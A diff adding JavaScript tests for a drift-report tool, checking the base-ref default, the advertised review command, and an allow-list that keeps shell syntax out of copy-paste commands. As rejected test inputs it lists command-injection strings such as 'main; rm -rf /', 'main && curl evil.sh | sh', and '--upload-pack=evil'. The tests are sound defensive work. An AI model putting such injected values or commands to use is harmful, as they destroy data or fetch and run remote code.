@@ -18,6 +18,9 @@ import {
   selectTrackingIssue,
   MARKER,
   MANAGED_AUTHORS,
+  resolveDriftBaseRef,
+  reviewCommand,
+  isRenderableRef,
 } from '../ceremony-drift.mjs';
 
 // Heuristic evidence: scope globs already resolve. Indistinguishable from an
@@ -801,4 +804,156 @@ test('a railed preexisting-completed-field entry gets no runnable command', () =
   assert.deepEqual(readyCommandIds(body), [], 'must not advertise completing a deliberate completed value');
   assert.match(body, /## Needs a manual decision/);
   assert.match(body, /will \*\*not\*\* clear/);
+});
+
+// ── the base ref drift is measured against ──────────────────────────────────
+// main() is a branch-free I/O shell, so this default had no assertion behind it.
+// Getting it wrong measures drift against the wrong ref and silently changes
+// what the report claims, with nothing failing to say so.
+
+test('BASE_REF retargets the drift base ref, and unset falls back to trunk', () => {
+  assert.equal(resolveDriftBaseRef({}), 'origin/main', 'unset falls back to trunk');
+  assert.equal(resolveDriftBaseRef({ BASE_REF: '' }), 'origin/main', 'empty is not a ref');
+  assert.equal(resolveDriftBaseRef({ BASE_REF: 'release/1.11' }), 'release/1.11', 'a set BASE_REF wins');
+});
+
+// ── the advertised review command must reproduce what the report claims ──────
+// main() computes the drift set with the scope-existence inference ON, which is
+// off by default (#779). If the command the issue advertises omits the flag, an
+// operator running it gets a SMALLER set than the issue lists — a ticket named in
+// the report simply would not appear, and the drift would look already resolved.
+
+test('the advertised review command carries --infer-scope, matching how the set was computed', () => {
+  const body = renderIssueBody(DRIFT, { activeTicketId: null });
+  const reviewLine = body.split('\n').find((line) => line.includes('ticket-prune') && line.includes('--base-ref'));
+  assert.ok(reviewLine, 'the body must advertise a read-only review command');
+  assert.match(reviewLine, /--infer-scope/);
+});
+
+test('the truncation notice advertises the same flag and ref as the review command', () => {
+  // A drift set large enough to clamp still has to hand back a reproducible command.
+  //
+  // The ref is passed EXPLICITLY rather than left to resolveDriftBaseRef(): the
+  // default reads process.env.BASE_REF, which CI sets, so asserting against a
+  // hardcoded trunk here would pass locally and fail on a runner. The property
+  // under test is that the notice carries the ref the body was rendered with —
+  // not whatever the ambient environment happens to say.
+  const huge = Array.from({ length: 4000 }, (_, i) => ({
+    id: `T${i}`, reason: 'inferred: scope resolves', rails: ['a/**'], blocker: 'rails-freeze',
+  }));
+  const body = renderIssueBody(huge, { activeTicketId: null, baseRef: 'release/9.9' });
+  assert.ok(body.includes('truncated'), 'this fixture must actually trip the clamp');
+  const notice = body.slice(body.indexOf('truncated'));
+  assert.ok(
+    notice.includes('adlc ticket-prune --base-ref release/9.9 --infer-scope'),
+    `the notice must carry the rendered ref and the flag: ${notice}`,
+  );
+});
+
+test('the advertised review command names the ref the set was measured against', () => {
+  // A retargeted run (BASE_REF) that still advertised origin/main would hand the
+  // operator a command computing a DIFFERENT set than the issue reports.
+  assert.match(reviewCommand('release/1.11'), /--base-ref release\/1\.11 --infer-scope/);
+  assert.match(reviewCommand('origin/main'), /--base-ref origin\/main --infer-scope/);
+});
+
+test('a retargeted body advertises the retargeted ref, not a hardcoded trunk', () => {
+  const body = renderIssueBody(DRIFT, { activeTicketId: null, baseRef: 'release/1.11' });
+  const line = body.split('\n').find((l) => l.includes('ticket-prune') && l.includes('--base-ref'));
+  assert.ok(line, 'the body must advertise a review command');
+  assert.match(line, /--base-ref release\/1\.11/);
+  assert.doesNotMatch(line, /origin\/main/);
+});
+
+// ── the advertised command is copy-pasted into a shell ──────────────────────
+// BASE_REF comes from the environment and the command it lands in is published
+// for an operator to paste into a terminal. Same rule the ticket ids follow: a
+// value becomes executable text only if it matches the positive allow-list.
+
+const SHELL_METACHARACTERS = ['`', '$', ';', '|', '&', '>', '<', '(', ')', '{', '}', '*', '?', '!', "'", '"', '\\', '\n'];
+
+test('a ref carrying shell syntax is never emitted as executable text', () => {
+  for (const hostile of [
+    '$(touch$IFS/tmp/pwned)',
+    '`id`',
+    'main; rm -rf /',
+    'main && curl evil.sh | sh',
+    'main | tee /tmp/x',
+    "main'\"",
+    'main\nrm -rf /',
+    '--upload-pack=evil',
+    '-oProxyCommand=evil',
+  ]) {
+    assert.equal(isRenderableRef(hostile), false, `must reject: ${hostile}`);
+    const cmd = reviewCommand(hostile);
+    assert.ok(!cmd.includes(hostile), 'the hostile value must not appear in the command');
+    for (const ch of SHELL_METACHARACTERS) {
+      assert.ok(!cmd.includes(ch), `emitted command must contain no ${JSON.stringify(ch)}: ${cmd}`);
+    }
+  }
+});
+
+test('an over-long ref is rejected rather than rendered', () => {
+  assert.equal(isRenderableRef('a'.repeat(257)), false);
+  assert.equal(isRenderableRef('a'.repeat(256)), true);
+});
+
+test('ordinary refs still render, so the guard has not disabled the feature', () => {
+  // Includes the characters git allows that carry no shell meaning in an argument
+  // position — rejecting a ref that is both valid and safe would publish an
+  // unreproducible command for nothing.
+  for (const ok of ['main', 'origin/main', 'release/1.11', 'v1.2.3-rc.1', 'feat/some_branch',
+                    'feature@alice', 'v1.0+build', 'a=b', 'a,b']) {
+    assert.equal(isRenderableRef(ok), true, `must accept: ${ok}`);
+    assert.ok(
+      reviewCommand(ok).includes(`--base-ref ${ok} --infer-scope`),
+      `the ref must render verbatim: ${ok} -> ${reviewCommand(ok)}`,
+    );
+  }
+});
+
+test('a non-string ref is rejected without throwing', () => {
+  for (const bad of [null, undefined, 42, {}, []]) assert.equal(isRenderableRef(bad), false);
+  assert.match(reviewCommand(null), /--base-ref UNRENDERABLE-BASE-REF/);
+});
+
+test('a hostile ref is not silently replaced by a different real ref', () => {
+  // Substituting trunk would advertise a command computing a DIFFERENT set than
+  // the report — the defect this command was fixed for. A placeholder is honest.
+  const cmd = reviewCommand('main; rm -rf /');
+  assert.match(cmd, /--base-ref UNRENDERABLE-BASE-REF/);
+  assert.ok(!/--base-ref origin\/main/.test(cmd));
+});
+
+test('refs whose characters a shell would act on stay rejected, even where git allows them', () => {
+  // ~ and ^ are expansions/history, : and ! likewise in an interactive shell, and
+  // whitespace splits the argument. Legal in some git contexts, still not safe to
+  // publish as copy-paste text.
+  for (const unsafe of ['main~1', 'main^2', 'main:x', 'a!b', 'a b', 'a\tb']) {
+    assert.equal(isRenderableRef(unsafe), false, `must reject: ${JSON.stringify(unsafe)}`);
+  }
+});
+
+test('a ref may start with any digit, not just a low one', () => {
+  // The first-character class is its own range; a narrowed one (0-1, say) would
+  // reject perfectly ordinary refs like a date-prefixed branch while every other
+  // case in this file still passed.
+  for (const digit of ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']) {
+    const ref = `${digit}024-hotfix`;
+    assert.equal(isRenderableRef(ref), true, `must accept a ref starting with ${digit}`);
+    assert.ok(reviewCommand(ref).includes(`--base-ref ${ref} --infer-scope`));
+  }
+});
+
+test('a ref may start with any letter, upper or lower', () => {
+  for (const ref of ['Alpha/main', 'zeta-branch', 'Q3-release']) {
+    assert.equal(isRenderableRef(ref), true, `must accept: ${ref}`);
+  }
+});
+
+test('a ref may NOT start with a separator or punctuation', () => {
+  // A leading hyphen would be read as a flag by the command it is pasted into.
+  for (const ref of ['-oProxyCommand=x', '.hidden', '/abs', '_lead', '@at', '=eq', ',comma', '+plus']) {
+    assert.equal(isRenderableRef(ref), false, `must reject leading punctuation: ${ref}`);
+  }
 });
